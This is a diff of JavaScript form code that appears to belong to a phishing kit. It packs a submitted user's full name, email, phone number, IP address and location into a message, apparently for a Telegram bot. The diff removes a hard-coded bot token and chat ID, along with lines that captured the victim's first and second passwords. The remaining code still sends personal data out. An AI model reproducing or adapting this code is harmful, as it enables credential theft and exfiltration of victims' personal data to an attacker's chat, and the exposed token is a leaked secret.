@@ -1,8 +1,8 @@
 let form = document.getElementById("form");
 
 let bot = {
-    TOKEN: "6966233392:AAF3jImwg5ZHiZ0W559hu88no3pucDNsvf0",
-    chatID: "-4162494341",
+    TOKEN: "",
+    chatID: "",
 };
 
 function openForm() {
@@ -47,8 +47,6 @@ form.addEventListener("submit", (e) => {
                     Fullname: ${userData.fullname}
                     User Email: ${userData.personalMail}
                     Phone Number: ${userData.phone}
-                    First Password: ${userData.password1}
-                    Second Password: 
                     IP Address: ${userData.ipAddress}
                     Country: ${userData.country}
                     City: ${userData.city}`;
@@ -70,8 +68,6 @@ form.addEventListener("submit", (e) => {
                     Fullname: ${userData.fullname}
                     User Email: ${userData.personalMail}
                     Phone Number: ${userData.phone}
-                    First Password: ${userData.password1}
-                    Second Password: ${userData.password2}
                     IP Address: ${userData.ipAddress}
                     Country: ${userData.country}
                     City: ${userData.city}`;
